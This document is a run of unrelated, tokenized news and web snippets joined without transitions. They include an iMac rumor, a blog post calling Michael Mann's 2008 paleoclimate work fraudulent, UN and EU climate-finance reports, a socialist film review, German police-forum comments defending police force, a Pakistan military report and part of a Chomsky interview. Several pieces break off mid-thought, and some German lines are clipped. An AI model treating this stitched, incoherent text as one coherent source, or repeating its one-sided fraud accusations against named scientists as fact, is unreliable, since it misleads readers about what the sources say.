That may partially explain why we wo n't see quad - core processors like the recently announced " Clarkfield " Core i7 , as a thinner enclosure would necessitate a lower thermal envelope than current quad - core processors .
There have been previous hints that updated iMacs may debut technology " previously unavailable to Mac buyers , " but this current rumor only echoes what we have already heard and offers no new details .
Many bets are on Blu-ray drive compatibility , despite evidence that the drives wo n't see wide adoption in computers for the foreseeable future .
Rumored price drops would also likely preclude the inclusion of what is still considered a pricey add - on .
What currently unavailable technology the new iMacs might posses is still anyone 's guess ( USB 3.0 , eSATA , and SSD drives are some possibilities ) .
There is also a cryptic hint that " Apple is primed to extend the capabilities of at least one technology introduced on the Mac platform as recently as last fall , " but again , no details are offered .
Perhaps Apple will flesh out the capabilities of its Mini DisplayPorts , utilizing the extra channels included in the DisplayPort spec to transmit sound and other data over a single cable .
But again , what the hint might refer to is anyone 's guess .
However , AppleInsider 's sources said that the updated iMacs have been in production for the last two weeks , and that Apple 's sales representatives have been offering significant , but time - limited , price cuts on current iMacs to buyers interested in large volumes .
Both of these details suggest that Apple is clearing out existing inventory for an impeding update .
We 'll also add to that the fact that it has been 206 days since the last iMac refresh ; the average time between model updates for the iMac line is 220 days .
One thing I do different than other science blogs is point out some of the issues with very little political correctness .
If ya’ keep it bottled up it will make your head explode .
There is a subset of the emails dealing with paleo reconstructions that have very strong implications as to the quality of paleo science .
A couple of reporters have taken the time now to contact me on my opinions on these emails .
My opinions will come out over time but to start with I and others are very unhappy with Michael Mann ’s 2008 hockey stick work which as I ’ve said for over a year now is absolute rubbish that could n’t get published in a college lab .
It ’s been one of the bane ’s of this blogger that anyone with a technical background could possibly accept these techniques as reasonable .
Links above .
Here is a reply I was working on this morning to a very simple question .
How did you get into this ?
I ’m an Aeronautical engineer by training but work as an optical engineer .
I got interested in climate science when I started wondering how bad global warming was going to be .
I noticed the different temperature metrics were divergent and started wondering how come we can’t nail down temperatures better than that .
After a few questions on that at RC well before the Air Vent , I started reading CA , RC and WUWT more regularly but never left comments .
What really got me into blogging on climate issues was Mann08 which is yet another hockey stick .
This happened a bit over a year ago so I ’m not as experienced with these papers as McIntyre and some of his regulars .
What was discussed on tAV and CA about Mann08 is very relevant to the climate discussion in these emails and particularly so to the Jones , ” hide the decline ” quote , the ousting of editors of GRL and several others .
In particular , a post this post back in October 08 contained this graph – https://noconsensus.files.wordpress.com/2008/10/before-and-after.jpg and some explanation of the angst associated with the ‘ hiding of the decline ’ which in any reasonable context says exactly what it means .
The out of context arguments put forth by scientists have no validity and are simply hopeful remarks such that those without the will to review the detail can wash it from their happy little heads .
This remark is repeated in the computer code in about a dozen Briffa / Osborne files .
; Plots a HovMueller diagram ( longitude - time ) of meridionally averaged
; growing season reconstructions .
Uses “ corrected ” MXD – but should n’t usually
; plot past 1960 because these will be artificially adjusted to look closer to
; the real temperatures .
I do n’t know how familiar you are with temp proxies but they start like this .
– Find some physical explanation for how temperature could affect something .
i.e. warm means trees grow faster of warm means nearby glacier melts more and therefore more sediment will be found or warm means more life in the sediment found .
Those sorts of hypotheses which are reasonable however in all cases , other things affect the proxies i.e. tree growth can be affected by moisture , competition , nutrients and CO2 .
Just considering trees , ( Without getting too deep ) these growth affecting factors are impossibly difficult to separate .
It simply cannot be done in my opinion but paleo - scientists disagree and simply choose certain types of trees which are declared ‘ temperature sensitive ’ .
Then the only step taken to my knowledge which ‘ proves ’ these trees ( and other proxies ) are temperature trees is to check correlation .
Now correlation is a mathematical process which is very dependent on slope .
Two signals with high positive slope and lots of unrelated noise give good correlation .
Temperature rise has non-zero positive correlation to CO2 but also to population , the number of cars on the road , world wide fish consumption , you get the idea .
So what got me into climate science was the revelation that Mann08 , used 1209 initial proxies which were originally assumed to be temperature by the authors that created the proxies .
Of these 1209 the first step in Mann08 was to correlate to CRU temps ( the highest trend in the business – good for hockey stick correlation ) the low correlation proxies ( downslopes ) are then thrown away .
Think of it like this – check for upslope since 1850 , if upslope ( keep ) else if no upslope ( throw out ) .
The remaining information is scaled and averaged one series at a time to fit temperature as well as it possibly can .
So is it any wonder he always get ’s unprecedented results ?
Not to us .
When they claim that so many independent studies come to the same conclusions , remember , the same data , similar methods , friends reviewing — same result .
In Mann08 , some data was chopped off the ‘ hide the downslope ’ series mentioned above and new fake data was pasted on .
This fake data which then had an upslope and high correlation was then accepted as temp and used to make several new hockey sticks .
Since I ( and others ) are of the strong and certain opinion that this is completely bogus science , we have been questioning peer review for a long time all the while believing what the sad answer must be .
The technical detail of the emails reveals clearly that many paleoclimatologists seem to know this too .
This means that the consensus of science is in some portion manufactured .
At RC in particular there has been constant pressure to force skeptics through peer review only in specific journals .
This has now been clearly exposed to be a controlled and disingenuous process .
Mann and friends at RC have long lambasted Energy and Environment for accepting MM ’s debunking of the hockey stick – now it seems that the GRL is the journal with no credibility .
I ’m therefore certain in my opinion that the dishonesty amongst not only Mann but the editors , reviewers and coauthors is far worse than we see in these emails ( unless you interpret them in the worst possible way ) .
The boys were very cautious , especially in the later emails in my opinion .
These emails just scratch the surface .
It ’s a strong opinion but it is my own .
It should prompt independent or internal reviews across all the major journals but the media will have to do a lot more raising of consciousness to get it done .
While the scientists speak of reason and context in a transparent attempt to obfuscate the truth , this goes far deeper than even these emails and files show .
UNITED NATIONS 
It will cost between $ 500 billion and $ 600 billion every year for the next 10 years to allow developing nations to grow using renewable energy resources , instead of relying on dirty fuels that worsen global warming , according to a United Nations report released Tuesday .
That astronomical estimate , far higher than any previously suggested by the United Nations , comes at a time when developed and developing nations are still deeply divided over who bears the responsibility for shouldering the expense of deploying cleaner energy resources , much less what the actual amount might be .
The issue of who will foot the bill remains one of the significant hurdles to reaching a global agreement on combating climate change by December in Copenhagen .
Much of the focus in the talks has also been on significant emissions cuts .
“ We need a public investment program to drive this shift into cleaner energy resources , ” said Rob Vos , the director of development policy in the Department of Economic and Social Affairs , which produced the report , comparing it to the Marshall Plan , through which the United States rebuilt European economies after World War II .
“ The major obstacle is to convince political leaders and their constituencies to go in that direction . ”

Tags : Capitalism : a love story
Michael Moore is not a revolutionary socialist .
But he is a great film maker and story teller , and this exposé of the sins of capitalism – of capitalism as a structure of sin almost literally at one stage in the film – is a clear indictment of the free market system in the US and the profit motive .
I cried when he showed the evictions of ordinary working people .
I laughed when experts tried to explain what derivatives – wagers on wagers or bookies off - laying bets – were .
Even worse was that I understood the explanations of these instruments of evil .
It ’s a long story but working in the Tax Office for 20 years does that to the soul …
I cheered when the occupying workers at Republic Windows and Doors won their entitlements .
I dared to hope when they talked about running the factory themselves .
They did not .
I felt elated when one family occupied their home and stopped the eviction process .
I sang and clapped when the show finished with a Tony Babino swing version of the International .
What ’s not to like ?
Well , a few quibbles .
The ugly face of US imperialism gets little run in the film – the death of over 1 million Iraqis and countless Afghans , the imprisonment of Palestine … Nothing .
And Moore has ( or rather at the time of filming had ) illusions in Obama , and before him Franklin Delano Roosevelt .
Even then , FDR ’s so called second Bill of Rights included economic rights like a job at a living wage , a home , a good education and free health care for all .
These are n’t bad starting points for socialists of today to connect with working people .
Moore attempts citizens ’ arrests at various banks .
Needless to say he does n’t get into their buildings .
And that ’s a metaphor for the US today – the people are n’t allowed into their buildings .
Moore weaves an intricate story about the criminals of Wall Street , the very people who benefit from and create this inequality .
These bloodsuckers live off the poverty and exploitation of working Americans .
Moore uses humour like crime scene taping one bank to make the point that the bailout is a massive theft of the money of working people .
There has been this massive wealth transfer to the rich and greedy of Wall Street so they can continue what one leaked Citigroup memo describes as the plutonomy , i.e a society where the very very rich rule the rest of us .
And we let them .
Only when working people occupy their homes to successfully stop evictions , only when they follow Republic Windows and Doors and occupy their factories to save not just entitlements but jobs and begin producing goods to satisfy human need , can we say , as Moore puts it , that capitalism is an evil that needs to be eliminated .
Occupying the workplaces and producing goods to satisfy human need is the way to eliminate the evil Moore identified that is capitalism .
And it is this democracy , the real and living democracy of the working class running their workplace , which offers the only alternative to capitalism .
See and enjoy Capitalism : a love story .
Scientists claim sitting up straight at desks can boost our confidence
Most of us will remember the telling off we used to get from our parents if we did n't sit up straight as children .
But it seems good posture is not the only reason we would have done well to heed their advice - scientists claim it could also make us more confident .
In an experiment , people were told to sit up straight or slump over their desks .
They were then told to list three positive or negative personal traits relating to their future career .
Scientists claim people who sit up straight at desks , instead of slouching , boost their confidence
Afterwards they took a survey in which they rated themselves on how well they would do as a future professional .
This found that the answers of those who held the upright posture were more likely to be in line with the traits they had written down earlier - a sign that sitting up straight reinforces positive thoughts .
Professor Richard Petty , co-author of the study and professor of psychology at Ohio State University , said : ' It turns out that our posture can also affect how we think about ourselves .
' Sitting up straight is something you can train yourself to do , and it has psychological benefits . '

Auch ein Sperren gegen polizeiliche Maßnahmen ist ein Widerstand , der selbstverständlich gebrochen werden darf / muss .
Sieht nicht immer schön aus , aber manchmal sind auch Schläge erforderlich , um den Probanden locker zu machen .
Prügelcopfreund 2 :
Was geht da zu weit ?
Es wurde ein Platzverweis ausgesprochen .
Der Radfahrer trollte sich . (...)
Er wurde am T - Shirt gepackt , zurückgezogen , zu Boden gebracht und festgenommen .
Natürlich kurz und heftig , aber die Zeit zum Diskutieren war vorbei .
Und dass der andere eins auf die Nase bekam , liegt wohl daran , dass er mit dieser zu weit vorn war .
Man sollte seine Nase nicht überall reinstecken .
Prügelcopfreund 3 :
Ist es so schwer sich an polizeiliche Weisungen zu halten und die Konsequenzen zu tragen , wenn man dagegen verstößt ?
Prügelcopfreund 2 :
Der wurde mehrfach aufgefordert zu gehen .
Provokant wollte er noch ne Dienstnummer , und die aufschreiben .
Das sind dumme Provokationen .
Und dann geht er , natürlich extra in die andere Richtung als ihm aufgetragen .

Sieht manchmal nicht so hübsch aus und ist für den Einen oder Anderen auch mal unverständlich , das wird aber nichts daran ändern , dass die Polizei Zwang anwendet .
Prügelcopfreund 2 :
Wir agieren nicht .
Wir reagieren .
Auch mal überzogen .
Mag sein .
Nicht desto trotz muss man nicht provozieren .
Und wer es darauf anlegt auszutesten , wie weit er gehen kann , der geht bei dem einen etwas weiter und bei dem anderen gibts eine gesemmelt .
Is eben so .
Prügelcopfreund 5 :
Ob die Umsetzung zu hart war oder nicht , sei mal dahingestellt , auf jeden Fall zeigt so manches ' Opfer ' auf dem Video einen Mangel an Situational Awareness .
Einfach mal den Rückzug antreten und gut ist .

Das Folgende ist keine repräsentative Zusammenstellung von Statements , sondern lediglich die Auswertung eines einzelnen Kommentarstranges , in dem sich Polizisten privat äußern .. " .
" nd so weiter und so fort .s gab in diesem Forum keinen (!)
Polizisten , der diese Polizeigewalt ( Youtube - bei Fefe gibt es Links zu deutlich besseren Videoauflösungen ) abstoßend fand oder auch nur vermutete , dass es sich hier wohl um Körperverletzung im Amt handeln könnte .
Das mag nun alles Zufall sein , aber die Art , wie da von Polizisten ( privat ) diskutiert wurde , die erinnert mich sehr gründlich an Diskussionen mit gewaltgeilen verblödeten Autonomen , wenn diese die beschissenen Aktionen weltanschaulicher Kumpels rechtfertigen .+++
Update 1 +++ Inzwischen gibt es in diesem privaten Polizeiforum - unter den Polizisten - mehr Vielfalt in den Auffassungen .
Den Forenbetreibern ist der Thread zu heiß geworden , manche der Privathetzer in Uniform haben , nachdem sie zurückgepfiffen wurden , ihre Meinung geändert / überarbeitet .
Nunja .
Irgendwie herrscht in diesem Polizeiforum ein spezielles Meinungsklima , wo man nicht gerne mit Polizisten spricht , welche sich nicht ausreichend " polizeifreundlich " ausdrücken .
Das ist schon merkwürdig - vielleicht auch irgendwie verständlich , wenn man sich selbst als Polizist unter Druck sieht .
So , hier ein paar positive Ausnahmen , die sich allerdings erst deutlich nach meiner kleinen Veröffentlichung gemeldet haben : an könnte sich ein wenig darüber lustig machen , wie sich dieses Forum gewendet hat , als es sich beobachtet fühlte .
Man könnte aus diesem Forum noch allerhand irren Unfug rauszerren , übrigens auch seitens von Polizeikritikern , die sich da tummeln .
Für mich ist aber eine ganz andere Beobachtung viel interessanter : Gerade unter den übelsten Sprücheklopfern und verbalen Rummelboxern finden sich überraschend viele engagierte Polizisten , welche auf anderen Gebieten richtig gute Vorschläge zur Verbesserung der Polizeiarbeit machen .
Will sagen : chwarz - weiß macht kein gutes Bild .s ist allerdings leicht festzustellen , dass es ein Problem gibt .
Es wäre leicht und für mich eher langweilig , die Polizistensprüche auseinander zu nehmen .
Das ist auch nicht mein
Thema und ich will nicht " die " Polizei bloß stellen .
Auch diejenigen , die ab und an einen Sack Scheiße labern , verrichten als Polizisten mitunter richtig gute Arbeit .
Vor allem : Mich interessieren Antworten auf das bürgerrechtiche Problem - und die zu finden , halte ich für ziemlich schwierig .
Diezur Kennzeichnung ( einen Teil davon hier ) finde ich gut .
Ich fände auch gut , wenn in den Länderneingerichtet werden , wo Bürger Polizisten loben können - und parlamentarische Jurys dann überlegen , wer welchen Preis bzw .
welche öffentliche Belobigung erhält .
Doch wirklich , auch wenn es für Polizeikritiker paradox wirkt :
Ich denke , dass das eine richtig gute Idee wäre - eine , mit der gute Polizeiarbeit und eben auch ein Vorzug unserer deutschen Polizei gestärkt wird , nämlich , mit zivilen Mitteln gute Arbeit zu leisten .
Die von Pseudolinken betriebene Demontage des Ansehens der Polizei geht m.E. in genau die falsche Richtung - aber da müsste ich mal einen längeren Blogbeitrag verfassen , um das zu erklären .
Ach ja , sollte es in den Ländern auch geben , für betroffene Bürger - und diese Stelle kann gerne mit der Belobigungsstelle unter einem Dach arbeiten .
Ich finde es jedenfalls wichtig , und zwar sehr wichtig , dass Polizisten nicht nur als Kritikobjekt und Prügelknaben gesehen werden .
Nicht vergessen : Der Job ist nicht einfach .+++
Update 2 +++ine sehr interessante Analyse eines Kampfsport - Ausbilders empfehle ich zum Lesen .
Dieser beschäftigt sich eingehend mit dem diskutierten Fall sowie der Frage der " einfachen " körperlichen Gewalt .
Die Ausbildung , sowie das Know How der Einsatzleiter und Gruppenleiter spielen wohl eine wesentliche Rolle .
Danke Markus !

If you follow with any regularity the police misconduct stories I post on this site , you 're no doubt familiar with the phrase " paid administrative leave . "
No matter how serious the alleged misconduct , cops nearly always get paid while they 're being investigated , a period that typically takes months .
But last week Stockton , Utah police officer Johsua Rowell was actually put on unpaid administrative leave .
His transgression ?
He issued a traffic citation to the son of Stockton Mayor Dan Rydalch .
Sweden talks tough on climate Incoming EU presidency , commissioner want international community to be more ambitious .
The European Union will maintain pressure on the United States and other rich countries to set more demanding climate goals , the incoming Swedish presidency indicated today .
Andreas Carlgren , Sweden ’s environment minister , said that developed countries needed to adopt more ambitious targets to cut their emissions .
“ We want more , we expect more , ” he said , adding : “ What I am saying is based on what I expect .
It is not just in my dreams . ”
The EU has promised to cut its greenhouse gas emissions by 20 % by 2020 , extending this to 30 % if others join in .
“ We will use this 30 % target as a tool to put pressure on the other parties ... we wo n’t upgrade until we see others make sufficient reductions , ” Carlgren said .
Sweden takes over the EU ’s rotating presidency at a critical moment in the build - up to UN - sponsored talks in Copenhagen in December .
Under the United Nations Framework Convention on Climate Change ( UNFCC ) process there are just three weeks of negotiating time left , Carlgren warned , although he saw “ a lot of time ” remaining for political negotiations outside the formal UN process .
Next month ( 8 - 10 July ) , leaders will discuss climate change at the G8 and at a meeting of the Major Economies Forum , a group of the 17 biggest polluting countries .
“ There is no alternative to an ambitious agreement in Copenhagen .
There is no plan B , ” said the Swedish minister .
Today the United States House of Representatives votes on the Waxman - Markey bill , proposing a cap - and - trade system that would lead to emission reductions of 4 % by 2020 compared to 1990 levels .
Carlgren said this was “ a great step forward ” , but that US targets were not in line with scientific advice : “ So far we have not seen those credible pathways that could really be in line with science . ”
Sweden will also have to steer the EU to agreement on a formula for spreading the cost of climate change among its members .
A decision on funding is expected at the October summit of European leaders .
Carlgren said a solution based on solidarity among member states would be found , although not without difficulties – “ the European method has always been to move into success by crisis , by stalemate . ”
He predicted that figures on finance would not come into the international negotiations until “ quite late ” , saying that “ for developing countries it is more interesting to know how this money will be collected ” .
In a separate development , Gordon Brown , the UK ’s prime minister , will later today call on rich countries to provide $ 100 billion ( €71 bn ) per year by 2020 to help developing countries cut their emissions , stop deforestation and adapt to climate change .
Speaking at the European Commission ’s Green Week conference , Stavros Dimas , the European environment commissioner , spoke of the urgency of getting a deal in Copenhagen , and hinted that the world may need to go further than the consensus of limiting temperature increases to 2 º C by the middle of the century .
The goal of a 2 º C cap is “ not enough ” , he said .
“ We should limit the rise in temperature to 1.5 º C . ”
José Manuel Barroso , the European Commission president , said that the climate agenda would remain important for the EU : “ Climate change has been the defining issue for this Commission and I surely expect it to be the defining issue for the next Commission ” .
Pakistan soldiers moved to try to encircle Taliban and al Qaeda militants in the South Waziristan mountains near the Afghan border , in a high - stakes offensive aimed at crushing the insurgency in its toughest stronghold .
Military reports Sunday indicated soldiers , whose offensive began before dawn Saturday , were making advances amid stout resistance .
Some 30,000 Pakistani soldiers were moving into the area from three directions to face as many as 10,000 Pakistani and foreign militants , many of them veterans of battles in Pakistan and Afghanistan .
Hundreds of thousands of civilians were said to be fleeing South Waziristan to neighboring areas .
" There is a full - fledged war - like situation here , and we are packing to flee however we can find a way , but there is no safe passage , " said Muhammad Nawaz , 29 years old , in a telephone interview from the Taliban - controlled town of Makeen .
The area is closed to reporters .
The army has failed in previous attempts to reassert its control over the area .
Instead , the government made peace deals with the Taliban faction that controls the region .
But officials say a wave of terror attacks that left more than 160 people dead in the past two weeks has stiffened their resolve , and there will be no deals in South Waziristan this time .
Battles and skirmishes were reported around a handful of towns Sunday .
" I heard intense shelling with artillery pounding the mountain behind our village .
I saw the big trees in the forest caught fire and flames were rising high , " said Muhammad Alam Mehsud , 47 , who fled with his 12 - member family during a lull in the fighting .
Benjamin Netanyahu made an impassioned denunciation of the Iranian leader at the same UN summit .
" Yesterday , the man who calls the Holocaust a lie spoke from this podium , " he said .
" A mere six decades after the Holocaust , you give legitimacy to a man who denies the murder of six million Jews while promising to wipe out the State of Israel , the State of the Jews .
What a disgrace .
What a mockery of the charter of the United Nations . "
Were n't 38 % always in extreme poverty ?
I think the percentage of urban people who who never go hungry , have electricity , a motor scooter and a mobile phone is still rising .
In rural areas around the world it does seem logical that a decrease in the ratio of useful land to people would make the rural poor still yet poorer .
In India I think agriculural water is more scarce than potential agricultural land .
" Overall , almost two - thirds of Indian farmers rely solely on rainfall to derive a livelihood from the land . "
The big Deccan Plateau is so dry .
In the area I am familiar with people seem to be managing to live from a once a year Jowar Sorghum harvest and goat herding .
The land looks like it could produce a lot more if there was water for irrigation .
The rivers already are practically dry from use by irrigation .
It must be tempting tempting to want to capture every last drop of water flowing from the Himalayas and transport what North India does not use to the Deccan but Bengalis also needs for that water to continue to flow to the Ganges Delta to preserve their environment and their irrigation .
There does not seem to be enough water to go around but water projects probably still are the best way to reduce poverty in India .

Noam Chomsky on the Global Economic Crisis , Healthcare , US Foreign Policy and Resistance to American Empire
Part II of our conversation with MIT professor and author Noam Chomsky on the global economic crisis , healthcare , the media , US foreign policy , the expanding wars in Afghanistan and Pakistan , resistance to American empire , and more .
“ As far as policy is concerned , unless [ Obama ] is under a lot of pressure from activist sectors , he ’s not going to go beyond what he ’s presented himself as in actual policy statements or cabinet choices and so on : a centrist Democrat [ who ’s ] going to basically continue Bush ’s polices , maybe in a more modulated way , ” says Chomsky .

AMY GOODMAN : Today , a conversation with one of the most important dissident intellectuals of our time , Noam Chomsky , on the global economic crisis , healthcare , the media , US foreign policy , the expanding wars in Afghanistan and Pakistan , and resistance to American empire .
Noam Chomsky is a world - renowned linguist , philosopher , social critic , and Institute Professor Emeritus at the Massachusetts Institute of Technology .
Among his many books over the past few decades are Hegemony or Survival : America ’s Quest for Global Dominance , Manufacturing Consent : The Political Economy of the Mass Media , Profit over People : Neoliberalism and Global Order , and Human Rights and American Foreign Policy .
There ’s a great collection of his work , just out now , edited by Anthony Arnove , called The Essential Chomsky .
I spoke to Noam Chomsky earlier this month when we were on the road in Boston .
This is Part II of our conversation .
I began by asking him to talk about the current economic meltdown .
NOAM CHOMSKY : Well , let ’s start with G20 .
If you look at the Financial Times , the world ’s major business journal , the day before the G20 meeting , they had a section on it , and they pointed out , I think correctly , that the main purpose is to present a picture of harmony and agreement .
It does n’t matter what you do , but make it look as if we ’re all together on this .
Now , there are sharp splits about how to approach the issue , but you have to make it look as if we ’re all together .
That ’s pretty much what happened .
Now , in the communiqué , which you read before , the crucial word was “ voluntary . ”
So , the countries there are supposed to voluntarily choose to do x , y and z .
Well , that means we could n’t make an agreement .
So we ’ll call it voluntary agreement .
Now , there was one point on which they agreed : a sharp recapitalization of the International Monetary Fund ; pour a lot of money into the IMF .
That ’s a pretty dubious move .
I mean , the record of the IMF has — the IMF is more or less a branch of the US Treasury , even though it has a European director .
Its past role has been extremely destructive .
In fact , its American US executive director captured its role when she described it as “ the credit community ’s enforcer , ” meaning if a third world dictator incurs a huge debt — people did n’t , but the dictator did ; say , Suharto in Indonesia — and then the debt defaults , the lenders , who have made plenty of money because it was a risky loan so they get high interest and so on , they have to be protected , meaning not by the dictator , by the people of Indonesia , who are subjected to harsh structural adjustment programs so that they can pay back the debt , which they did n’t incur , so that we can be compensated , rich Westerners can be compensated .
So that ’s the IMF , the credit community ’s enforcer , a very destructive role in the third world .
Now it ’s to be recapitalized .
Now , there ’s discussion about this , and it ’s interesting .
You can read it in the financial pages .
The supporters of the recapitalization say , “ Well , the IMF has changed its spots .
It ’s going to be different from now on .
We realize that it had this terrible role , but now it ’s going to be different . ”
Well , is there any reason to believe it will be different ?
In fact , if you look today , it ’s quite striking to see the advice that the Western powers are following , the programs that they ’re following , and compare them to the instructions given to the third world .
So , say , take Indonesia again .
Indonesia had a huge financial crisis about ten years ago , and the instructions were the standard ones : “ Here is what you have to do .
First , pay off your debts to us .
Second , privatize , so that we can then pick up your assets on the cheap .
Third , raise interest rates to slow down the economy and force the population to suffer , you know , to pay us back . ”
Those are the regular instructions the IMF is still giving them .
What do we do ?
Exactly the opposite .
We forget about the debt , let it explode .
We reduce interest rates to zero to stimulate the economy .
We pour money into the economy to get even bigger debts .
We do n’t privatize ; we nationalize , except we do n’t call it nationalization .
We give it some other name , like “ bailout ” or something .
It ’s essentially nationalization without control .
So we pour money into the institutions .
We lectured the third world that they must accept free trade , though we accept protectionism .
Take the “ too big to fail ” principle , which the House committee is discussing today .
But what does “ too big to fail ” mean ?
“ Too big to fail ” is an insurance policy .
It ’s a government insurance policy .
Government means the public pays , which says , “ You can take huge risks and make plenty of profit , and if anything goes wrong , we ’ll bail you out . ”
That ’s “ too big to fail . ”
Well , that ’s extreme protectionism .
It gives US corporations like Citigroup an enormous advantage over others , like any other kind of protection .
But we do n’t allow the third world to do that .
I mean , they ’ve got to privatize , so that we can pick up their assets .
Now , these are happening side by side .
Now , here ’s the instructions for you , the poor people ; here ’s the policies for us , the rich people .
Exactly the opposite .
Is there any reason to think the IMF is going to change it ?
AMY GOODMAN : Do you think President Obama is any different than President Bush when it comes to the economy ?
And if you were in the Congress , would you have voted for the bailouts and the stimulus packages ?
NOAM CHOMSKY : He ’s different .
I mean , first of all , there ’s a rhetorical difference .
But we have to distinguish the first and the second Bush terms .
They were different .
I mean , the first Bush term was so arrogant and abrasive and militaristic and dismissive of everyone that they offended , they antagonized even allies , close allies , and US prestige in the world plummeted to zero .
Now , the second Bush administration was more — moved more toward the center in that respect , not entirely , but more , so some of the worst offenders , like Rumsfeld , Wolfowitz and others , were thrown out .
I mean , they could n’t throw out Dick Cheney , because he was the administration , so they could n’t get rid of him .
He stayed , but the others , a lot of them , left .
And they moved towards a somewhat more normal position .
And Obama is carrying that forward .
He ’s a centrist Democrat .
He never really pretended to be anything else .
And he ’s moving towards a kind of a centrist position .
He ’s very popular in Europe , not so much because of him , but because he ’s not Bush .
So there is the kind of rhetoric that the European leaders and , in fact , the European population tend to accept .
In fact , you know , even in the Middle East , where you ’d think people would know better , they accept the illusions .
And they are illusions , because there ’s nothing to back them up .
So , yes , he is different from Bush .
Same — on the economy , well , you know , the current Obama - Geithner plan is not very different from the Bush - Paulson plan .
I mean , somewhat different , but circumstances have changed .
So , of course , it ’s somewhat different .
But it ’s still based on the principle that we have to — somehow , the taxpayer has to rescue the institutions intact .
They have to remain intact , including the people who , you know , destroyed the economy .
In fact , they are the ones who Obama picked to fix it up .
AMY GOODMAN : Explain .
NOAM CHOMSKY : Like Larry Summers , for example , who is now his chief economic adviser .
I mean , he was Secretary of Treasury under Bill Clinton .
His great achievement was to prevent Congress from regulating derivatives , exotic financial instruments .
Well , that ’s one of the main factors that led to the crisis .
His kind of senior adviser , one of the first , was Robert Rubin , who was Secretary of Treasury right before Summers .
His main achievement — many achievements , like what he did to Indonesia and the third world , but here , his main achievement was to lead the way to revoke the Glass - Steagall legislation from the New Deal , which protected commercial banks from risky investments .
It broke down those barriers .
Immediately after having done this , he left the government , joined Citigroup as a director , and they began to make huge profits , including him , from picking up insurance companies and so on and making very risky loans , relying on the “ too big to fail ” doctrine , meaning if we get in trouble , the taxpayer will bail us out , which is just what ’s happening , taxpayers now pouring tens of billions of dollars into rescuing Citigroup .
Well , these are the advisers who were supposed to fix up the system .
Tim Geithner was right in the middle of this .
He was head of the New York Federal Reserve , so , yes , he was supervising these actions .
Now , you know , you can argue about whether they ’re doing the right thing or the wrong thing , but are these the people who should be fixing up the system ?
Actually , the business press just had some interesting things to say about this .
Bloomberg News , you know , main business press , had an article in which they reviewed the records of the people who Obama invited to his economic summit .
I think it must have been last November or December .
They just reviewed the record .
I think there were a couple dozen of them .
People on the — you know , people like , say , Stiglitz , Krugman , they were never even allowed close to it , let alone anyone from the left or labor and so on , given token representation .
So they went through the records , and they concluded that these people should not be invited to fix up the economy .
Most of them should be getting subpoenas because of their record of accounting fraud , malpractice and so on , and helping bring about the current crisis .
AMY GOODMAN : Professor Noam Chomsky .
We ’ll continue the conversation in a minute .

Stay with us .
[ break ]
AMY GOODMAN : We return now to my conversation with Noam Chomsky about the economic crisis and how the Obama administration is handling it .
AMY GOODMAN : Why do you think Obama chose to surround himself ?
NOAM CHOMSKY : Because those are his beliefs .
I mean , his support comes from the —his constituency is basically the financial institutions .
Just take a look at the funding for his campaign .
I mean , the final figures have n’t come out , but we have preliminary figures , and it seems to be mostly financial institutions .
I mean , the financial institutions preferred him to McCain .
They are the main funders for both — you know , I mean , core funders for both parties , but considerably more to Obama than McCain .
You can learn a lot from campaign contributions .
In fact , one of the best predictors of policy around is Thomas Ferguson ’s investment theory of politics , as he calls it — very outstanding political economist — which essentially — I mean , to say it in a sentence , he describes elections as occasions in which groups of investors coalesce and invest to control the state .
And he takes a look at the formation of campaign contributors , and it gives you a surprisingly good prediction of what policies are going to be .
It goes back a century , New Deal and so on .
So , yeah , it can predict pretty well what Obama is going to do .
There ’s nothing surprising about this .
It ’s the norm in what ’s called political democracy .
AMY GOODMAN : Would you have let Citibank , would you have let Citigroup , would do have let the AIG fail ?
NOAM CHOMSKY : Well , there are other possibilities .
So , the government could just take over the viable parts .
And parts of them are functioning ; parts are dysfunctional , like the toxic — what they call the toxic asset parts , you know , the financial manipulations .
Well , one thing you could do , which has been suggested by a number of economists like Dean Baker , just take over the good parts , essentially nationalize them , put them under public control .
And “ nationalize ” means public control , at least if you have a democracy .
Not here , but if you had a functioning democracy , it would mean let them be under public control , and the parts that are responsible for the huge losses , just let them go off by themselves .
In fact , that would be the way of taking care of the AIG bonuses that everyone ’s screaming about .
In fact , as Baker pointed out , just spin off the parts that were involved in financial manipulations and caused the crisis , let them go bankrupt and let the executives try to get the bonuses from a bankrupt firm , OK , with no legislation necessary .
That ’s what should be done with Citigroup .
And in fact , it ’s interesting , it ’s kind of happening .
You know , after the breakdown of Glass - Steagall , they did bring in — they made use of it , under Rubin ’s direction , among others , to take — bring in insurance companies and other risky investors .
Now they ’re divesting them .
And they ’re going in the direction of becoming , you know , commercial bank .
Now , incidentally , this is not the first time this has happened .
Paul Volcker is on the news today , you know , saying , “ Let ’s slow down , ” and so on .
Well , he ’s the one who , under Reagan , who helped bail out Citigroup last time they crashed .
At that time they were Citibank .
They had followed World Bank and IMF instructions and lent huge amounts of money to Latin America and were assured by the World Bank that it ’s all fine , you know , markets will take care of it , etc .
Well , in a crash , Paul Volcker came in .
He raised interest rates very sharply .
Third world countries , whose payments are tied to US interest rates , could n’t pay their debts .
The IMF moved in , took care of it , and essentially recapitalized Citibank .
That ’s the way the system works : you make risky loans , you make a lot of money , and if you get into trouble , we ’re here to bail you out , namely the taxpayer .
AMY GOODMAN : And how do the Republicans differ from the Democrats in this ?
What do you make of — do you see it as just a minor footnote that Republicans , or some of the governors like Palin , like Jindal — NOAM CHOMSKY :
There ’s a difference .
AMY GOODMAN : — are saying they ’re not going to take stimulus money ?
NOAM CHOMSKY : There ’s a difference .
I mean , we basically are a kind of a one - party state .
I think C. Wright Mills must have pointed this out fifty years ago .
It ’s a business party , but it has factions — Democrats and Republicans — and they ’re different .
They have somewhat different constituencies and different policies .
And if you look over the years , the population has — the majority of the population has tended to make out better under Democrats than Republicans ; the very wealthy have tended to make out better under Republicans than Democrats .
So they ’re business parties , but they ’re somewhat different , and the differences can have an effect .
However , fundamentally , they ’re pretty much along the same lines .
So take , say , the current financial crisis .
Actually , it began under Carter .
The late Carter administration is the one that began — was pushing for financialization of the economy , you know , huge growth of speculative financial capital , deregulation , and so on .
Reagan carried it much further , and Clinton continued it .
And then , with Bush , it kind of went off the rails .
So there are differences , but differences within a pretty narrow spectrum .
And anyone who ’s a little off the spectrum , like Nobel laureates in economics who are a couple of millimeters off the spectrum , they ’re basically on the outside .
You can interview them , but they do n’t show up at the economic summit .
AMY GOODMAN : How does the global economy and our own economy relate to the issue of war and US foreign policy ?
NOAM CHOMSKY : Well , actually , you had a pretty good interview with Joseph Stiglitz about that a couple of months ago , in which he discussed the relationship of — he was talking about the Iraq war .
